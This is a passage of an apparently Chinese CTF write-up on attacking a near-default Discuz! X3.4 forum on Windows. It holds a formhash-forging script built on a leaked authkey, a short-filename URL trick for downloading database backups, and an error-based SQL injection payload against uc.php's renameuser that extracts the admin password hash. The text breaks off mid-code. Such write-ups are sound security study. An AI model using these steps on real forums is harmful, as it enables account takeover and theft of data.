**作者：LoRexxar'@知道创宇404实验室  
时间：2020年5月11日 **  
**英文链接：**
周末看了一下这次空指针的第三次Web公开赛，稍微研究了下发现这是一份最新版DZ3.4几乎默认配置的环境，我们需要在这样一份几乎真实环境下的DZ中完成Get
shell。这一下子提起了我的兴趣，接下来我们就一起梳理下这个渗透过程。
与默认环境的区别是，我们这次拥有两个额外的条件。
1、Web环境的后端为Windows  
2、我们获得了一份config文件，里面有最重要的authkey
得到这两个条件之后，我们开始这次的渗透过程。
以下可能会多次提到的出题人写的DZ漏洞整理
  * [这是一篇“不一样”的真实渗透测试案例分析文章](https://paper.seebug.org/1144/)
# authkey有什么用？
    / -------------------------  CONFIG SECURITY  -------------------------- //
    $_config['security']['authkey'] = '87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E';
authkey是DZ安全体系里最重要的主密钥，在DZ本体中，涉及到密钥相关的，基本都是用`authkey`和cookie中的saltkey加密构造的。
当我们拥有了这个authkey之后，我们可以计算DZ本体各类操作相关的formhash（DZ所有POST相关的操作都需要计算formhash）
配合authkey，我们可以配合`source/include/misc/misc_emailcheck.php`中的修改注册邮箱项来修改任意用户绑定的邮箱，但管理员不能使用修改找回密码的api。
可以用下面的脚本计算formhash
    $username = "ddog";
    $uid = 51;
    $saltkey = "SuPq5mmP";
    $config_authkey = "87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E";
    $authkey = md5($config_authkey.$saltkey);
    $formhash = substr(md5(substr($t, 0, -7).$username.$uid.$authkey."".""), 8, 8);
当我们发现光靠authkey没办法进一步渗透的时候，我们把目标转回到hint上。
1、Web环境的后端为Windows  
2、 **dz有正常的备份数据，备份数据里有重要的key值**
# windows短文件名安全问题
在2019年8月，dz曾爆出过这样一个问题。
  * [windows短文件名安全问题 数据库备份爆破](https://gitee.com/ComsenzDiscuz/DiscuzX/issues/I10NG9)
在windows环境下，有许多特殊的有关通配符类型的文件名展示方法，其中不仅仅有
`<>"`这类可以做通配符的符号，还有类似于`~`的省略写法。这个问题由于问题的根在服务端，所以cms无法修复，所以这也就成了一个长久的问题存在。
具体的细节可以参考下面这篇文章：
  * [Windows下的"你画我猜" -- 告别效率低下的目录扫描方法](https://18.163.237.232xz.aliyun.com/t/2318#toc-6)
配合这两篇文章，我们可以直接去读数据库的备份文件，这个备份文件存在
    /data/backup_xxxxxx/200509_xxxxxx-1.sql
我们可以直接用
    http://xxxxx/data/backup~1/200507~2.sql
拿到数据库文件
从数据库文件中，我们可以找到UC_KEY(dz)
在`pre_ucenter_applications`的authkey字段找到UC_KEY(dz)
至此我们得到了两个信息：
    uckey
    x9L1efE1ff17a4O7i158xcSbUfo1U2V7Lebef3g974YdG4w0E2LfI4s5R1p2t4m5
    authkey
    87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E
当我们有了这两个key之后，我们可以直接调用uc_client的uc.php任意api。，后面的进一步利用也是建立在这个基础上。
# uc.php api 利用
这里我们主要关注`/api/uc.php`
![
](https://images.seebug.org/content/images/2020/05/963cac98-1537-4689-a928-9af2dc53bf74.png-w331s)
通过`UC_KEY`来计算code，然后通过`authkey`计算formhash，我们就可以调用当前api下的任意函数，而在这个api下有几个比较重要的操作。
我们先把目光集中到`updateapps`上来，这个函数的特殊之处在于由于DZ直接使用`preg_replace`替换了`UC_API`，可以导致后台的getshell。
具体详细分析可以看，这个漏洞最初来自于@dawu，我在CSS上的演讲中提到过这个后台getshell：
  * 
  * 
根据这里的操作，我们可以构造`$code = 'time='.time().'&action=updateapps';`
来触发updateapps，可以修改配置中的`UC_API`，但是在之前的某一个版本更新中，这里加入了条件限制。
    if($post['UC_API']) {
        $UC_API = str_replace(array('\'', '"', '\\', "\0", "\n", "\r"), '', $post['UC_API']);
        unset($post['UC_API']);
    }
由于过滤了单引号，导致我们注入的uc api不能闭合引号，所以单靠这里的api我们没办法完成getshell。
换言之，我们必须登录后台使用后台的修改功能，才能配合getshell。至此，我们的渗透目标改为如何进入后台。
# 如何进入DZ后台？
首先我们必须明白，DZ的前后台账户体系是分离的，包括uc api在内的多处功能，login都只能登录前台账户，
也就是说，进入DZ的后台的唯一办法就是必须知道DZ的后台密码，而这个密码是不能通过前台的忘记密码来修改的，所以我们需要寻找办法来修改密码。
这里主要有两种办法，也对应两种攻击思路：
1、配合报错注入的攻击链  
2、使用数据库备份还原修改密码
## 1、配合报错注入的攻击链
继续研究uc.php，我在renameuser中找到一个注入点。
    function renameuser($get, $post) {
            global $_G;
            if(!API_RENAMEUSER) {
                return API_RETURN_FORBIDDEN;
            }
            $tables = array(
                'common_block' => array('id' => 'uid', 'name' => 'username'),
                'common_invite' => array('id' => 'fuid', 'name' => 'fusername'),
                'common_member_verify_info' => array('id' => 'uid', 'name' => 'username'),
                'common_mytask' => array('id' => 'uid', 'name' => 'username'),
                'common_report' => array('id' => 'uid', 'name' => 'username'),
                'forum_thread' => array('id' => 'authorid', 'name' => 'author'),
                'forum_activityapply' => array('id' => 'uid', 'name' => 'username'),
                'forum_groupuser' => array('id' => 'uid', 'name' => 'username'),
                'forum_pollvoter' => array('id' => 'uid', 'name' => 'username'),
                'forum_post' => array('id' => 'authorid', 'name' => 'author'),
                'forum_postcomment' => array('id' => 'authorid', 'name' => 'author'),
                'forum_ratelog' => array('id' => 'uid', 'name' => 'username'),
                'home_album' => array('id' => 'uid', 'name' => 'username'),
                'home_blog' => array('id' => 'uid', 'name' => 'username'),
                'home_clickuser' => array('id' => 'uid', 'name' => 'username'),
                'home_docomment' => array('id' => 'uid', 'name' => 'username'),
                'home_doing' => array('id' => 'uid', 'name' => 'username'),
                'home_feed' => array('id' => 'uid', 'name' => 'username'),
                'home_feed_app' => array('id' => 'uid', 'name' => 'username'),
                'home_friend' => array('id' => 'fuid', 'name' => 'fusername'),
                'home_friend_request' => array('id' => 'fuid', 'name' => 'fusername'),
                'home_notification' => array('id' => 'authorid', 'name' => 'author'),
                'home_pic' => array('id' => 'uid', 'name' => 'username'),
                'home_poke' => array('id' => 'fromuid', 'name' => 'fromusername'),
                'home_share' => array('id' => 'uid', 'name' => 'username'),
                'home_show' => array('id' => 'uid', 'name' => 'username'),
                'home_specialuser' => array('id' => 'uid', 'name' => 'username'),
                'home_visitor' => array('id' => 'vuid', 'name' => 'vusername'),
                'portal_article_title' => array('id' => 'uid', 'name' => 'username'),
                'portal_comment' => array('id' => 'uid', 'name' => 'username'),
                'portal_topic' => array('id' => 'uid', 'name' => 'username'),
                'portal_topic_pic' => array('id' => 'uid', 'name' => 'username'),
            );
            if(!C::t('common_member')->update($get['uid'], array('username' => $get[newusername])) && isset($_G['setting']['membersplit'])){
                C::t('common_member_archive')->update($get['uid'], array('username' => $get[newusername]));
            }
            loadcache("posttableids");
            if($_G['cache']['posttableids']) {
                foreach($_G['cache']['posttableids'] AS $tableid) {
                    $tables[getposttable($tableid)] = array('id' => 'authorid', 'name' => 'author');
                }
            }
            foreach($tables as $table => $conf) {
                DB::query("UPDATE ".DB::table($table)." SET `$conf[name]`='$get[newusername]' WHERE `$conf[id]`='$get[uid]'");
            }
            return API_RETURN_SUCCEED;
        }
在函数的最下面，`$get[newusername]`被直接拼接进了update语句中。
但可惜的是，这里链接数据库默认使用mysqli，并不支持堆叠注入，所以我们没办法直接在这里执行update语句来更新密码，这里我们只能构造报错注入来获取数据。
    $code = 'time='.time().'&action=renameuser&uid=1&newusername=ddog\',name=(\'a\' or updatexml(1,concat(0x7e,(/*!00000select*/ substr(password,0) from pre_ucenter_members where uid = 1 limit 1)),0)),title=\'a';
这里值得注意的是，DZ自带的注入waf挺奇怪的，核心逻辑在
    \source\class\discuz\discuz_database.php line 375
    if (strpos($sql, '/') === false && strpos($sql, '#') === false && strpos($sql, '-- ') === false && strpos($sql, '@') === false && strpos($sql, '`') === false && strpos($sql, '"') === false) {
                $clean = preg_replace("/'(.+?)'/s", '', $sql);
            } else {
                $len = strlen($sql);
                $mark = $clean = '';
                for ($i = 0; $i < $len; $i++) {
                    $str = $sql[$i];
                    switch ($str) {
                        case '`':
                            if(!$mark) {
                                $mark = '`';
                                $clean .= $str;
                            } elseif ($mark == '`') {
                                $mark = '';
                            }
                            break;
                        case '\'':